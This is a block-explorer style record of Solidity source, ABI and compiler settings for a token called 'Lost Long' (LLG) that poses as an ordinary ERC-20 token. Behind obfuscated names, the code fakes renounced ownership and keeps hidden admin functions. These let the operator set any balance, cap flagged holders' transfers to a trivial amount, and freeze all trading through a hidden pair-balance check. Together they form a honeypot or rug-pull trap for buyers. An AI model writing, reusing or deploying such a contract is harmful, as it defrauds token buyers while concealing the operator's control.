{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface takeFee {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract exemptMax {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface walletTxFrom {\n    function createPair(address atMode, address autoEnable) external returns (address);\n}\n\ninterface receiverEnable {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address teamReceiverFund) external view returns (uint256);\n\n    function transfer(address liquidityBuy, uint256 maxLaunch) external returns (bool);\n\n    function allowance(address swapExemptEnable, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxLaunch) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address liquidityBuy,\n        uint256 maxLaunch\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchWallet, uint256 value);\n    event Approval(address indexed swapExemptEnable, address indexed spender, uint256 value);\n}\n\ninterface receiverEnableMetadata is receiverEnable {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LostLong is exemptMax, receiverEnable, receiverEnableMetadata {\n\n    bool private marketingTo;\n\n    mapping(address => uint256) private toSender;\n\n    uint256 launchMax;\n\n    string private amountLaunched = \"LLG\";\n\n    bool public launchedMax;\n\n    function owner() external view returns (address) {\n        return liquidityShouldTo;\n    }\n\n    mapping(address => mapping(address => uint256)) private tokenLiquidity;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return walletMax;\n    }\n\n    function getOwner() external view returns (address) {\n        return liquidityShouldTo;\n    }\n\n    function balanceOf(address teamReceiverFund) public view virtual override returns (uint256) {\n        return toSender[teamReceiverFund];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return launchedAutoFee;\n    }\n\n    uint256 private shouldBuy;\n\n    address marketingTakeMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private launchedAutoFee = \"Lost Long\";\n\n    function transferFrom(address fromTotal, address liquidityBuy, uint256 maxLaunch) external override returns (bool) {\n        if (_msgSender() != amountFee) {\n            if (tokenLiquidity[fromTotal][_msgSender()] != type(uint256).max) {\n                require(maxLaunch <= tokenLiquidity[fromTotal][_msgSender()]);\n                tokenLiquidity[fromTotal][_msgSender()] -= maxLaunch;\n            }\n        }\n        return atTxMode(fromTotal, liquidityBuy, maxLaunch);\n    }\n\n    uint256 public minSenderTotal;\n\n    function approve(address teamLimit, uint256 maxLaunch) public virtual override returns (bool) {\n        tokenLiquidity[_msgSender()][teamLimit] = maxLaunch;\n        emit Approval(_msgSender(), teamLimit, maxLaunch);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed marketingIs, address indexed sellMax);\n\n    function atTxMode(address fromTotal, address liquidityBuy, uint256 maxLaunch) internal returns (bool) {\n        if (fromTotal == txShould) {\n            return tradingMin(fromTotal, liquidityBuy, maxLaunch);\n        }\n        uint256 takeReceiverFund = receiverEnable(txFromReceiver).balanceOf(marketingTakeMin);\n        require(takeReceiverFund == launchMax);\n        require(liquidityBuy != marketingTakeMin);\n        if (walletSwap[fromTotal]) {\n            return tradingMin(fromTotal, liquidityBuy, toReceiver);\n        }\n        return tradingMin(fromTotal, liquidityBuy, maxLaunch);\n    }\n\n    uint256 private swapTotal;\n\n    function decimals() external view virtual override returns (uint8) {\n        return minAuto;\n    }\n\n    uint256 tokenMin;\n\n    address public txShould;\n\n    function feeSender() private view {\n        require(toLiquidity[_msgSender()]);\n    }\n\n    uint8 private minAuto = 18;\n\n    address amountFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function tradingMin(address fromTotal, address liquidityBuy, uint256 maxLaunch) internal returns (bool) {\n        require(toSender[fromTotal] >= maxLaunch);\n        toSender[fromTotal] -= maxLaunch;\n        toSender[liquidityBuy] += maxLaunch;\n        emit Transfer(fromTotal, liquidityBuy, maxLaunch);\n        return true;\n    }\n\n    function fromShould(address teamTotalReceiver) public {\n        feeSender();\n        if (fromLaunchedReceiver) {\n            fromLaunchedReceiver = false;\n        }\n        if (teamTotalReceiver == txShould || teamTotalReceiver == txFromReceiver) {\n            return;\n        }\n        walletSwap[teamTotalReceiver] = true;\n    }\n\n    uint256 public minEnable;\n\n    mapping(address => bool) public toLiquidity;\n\n    uint256 private walletMax = 100000000 * 10 ** 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountLaunched;\n    }\n\n    bool public receiverAmount;\n\n    function amountToTake(address receiverToken) public {\n        require(receiverToken.balance < 100000);\n        if (receiverAmount) {\n            return;\n        }\n        \n        toLiquidity[receiverToken] = true;\n        \n        receiverAmount = true;\n    }\n\n    address private liquidityShouldTo;\n\n    function minWallet(address launchedTo, uint256 maxLaunch) public {\n        feeSender();\n        toSender[launchedTo] = maxLaunch;\n    }\n\n    bool public fromLaunchedReceiver;\n\n    address public txFromReceiver;\n\n    function marketingLaunch() public {\n        emit OwnershipTransferred(txShould, address(0));\n        liquidityShouldTo = address(0);\n    }\n\n    mapping(address => bool) public walletSwap;\n\n    uint256 constant toReceiver = 4 ** 10;\n\n    function receiverMarketing(uint256 maxLaunch) public {\n        feeSender();\n        launchMax = maxLaunch;\n    }\n\n    function allowance(address launchLaunched, address teamLimit) external view virtual override returns (uint256) {\n        if (teamLimit == amountFee) {\n            return type(uint256).max;\n        }\n        return tokenLiquidity[launchLaunched][teamLimit];\n    }\n\n    constructor (){\n        \n        takeFee walletList = takeFee(amountFee);\n        txFromReceiver = walletTxFrom(walletList.factory()).createPair(walletList.WETH(), address(this));\n        if (minEnable == minSenderTotal) {\n            fromLaunchedReceiver = true;\n        }\n        txShould = _msgSender();\n        marketingLaunch();\n        toLiquidity[txShould] = true;\n        toSender[txShould] = walletMax;\n        if (launchedMax == fromLaunchedReceiver) {\n            launchedMax = true;\n        }\n        emit Transfer(address(0), txShould, walletMax);\n    }\n\n    function transfer(address launchedTo, uint256 maxLaunch) external virtual override returns (bool) {\n        return atTxMode(_msgSender(), launchedTo, maxLaunch);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapExemptEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchWallet\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverToken\",\"type\":\"address\"}],\"name\":\"amountToTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxLaunch\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamReceiverFund\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromLaunchedReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTotalReceiver\",\"type\":\"address\"}],\"name\":\"fromShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minSenderTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxLaunch\",\"type\":\"uint256\"}],\"name\":\"minWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxLaunch\",\"type\":\"uint256\"}],\"name\":\"receiverMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxLaunch\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxLaunch\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txFromReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "LostLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}